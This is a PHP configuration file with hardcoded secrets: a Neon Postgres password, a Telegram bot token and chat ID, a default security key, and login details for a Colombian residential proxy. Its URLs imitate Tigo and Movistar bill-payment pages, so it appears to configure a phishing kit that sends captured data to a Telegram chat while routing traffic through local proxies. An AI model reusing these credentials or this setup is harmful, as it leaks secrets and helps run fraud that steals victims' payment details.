<?php
// Parse DATABASE_URL if present (Render default)
// Si no hay variable, usamos por defecto la Base de Datos general NeonDB
$db_url_default = 'postgresql://neondb_owner:npg_qB4ekOrJpU7K@ep-polished-scene-amcxahll-pooler.c-5.us-east-1.aws.neon.tech/neondb?sslmode=require';
$db_url_env = getenv('DATABASE_URL') ?: $db_url_default;

$url = parse_url($db_url_env);
$db_host = $url['host'] ?? 'ep-polished-scene-amcxahll-pooler.c-5.us-east-1.aws.neon.tech';
$db_user = $url['user'] ?? 'neondb_owner';
$db_pass = $url['pass'] ?? 'npg_qB4ekOrJpU7K';
$db_name = ltrim($url['path'] ?? '/neondb', '/');
$db_port = $url['port'] ?? 5432;

// Neon require SSL
putenv("PGSSLMODE=require");

return [
    'botToken' => '8334889903:AAFvz341HwSjL3UG3BXq8rQf3RZWj0Gc9dA',
    'chatId' => '-5141648243',
    'db_host' => $db_host,
    'db_user' => $db_user,
    'db_pass' => $db_pass,
    'db_name' => $db_name,
    'db_port' => $db_port,
    'renderUrl' => 'https://movistarprueba.onrender.com',
    'baseUrl' => getenv('BASE_URL') ?: 'https://pagatufacturatigo.vercel.app/pagos/updatetele.php',
    'security_key' => getenv('SECURITY_KEY') ?: 'secure_key_123',
    // Proxy Residencial (Bright Data - Colombia)
    'proxy_host' => 'brd.superproxy.io',
    'proxy_port' => '33335',
    'proxy_user' => 'brd-customer-hl_73fe2062-zone-tigoproxy-country-co',
    'proxy_pass' => 'j4od0e20ohqj'
];
?>
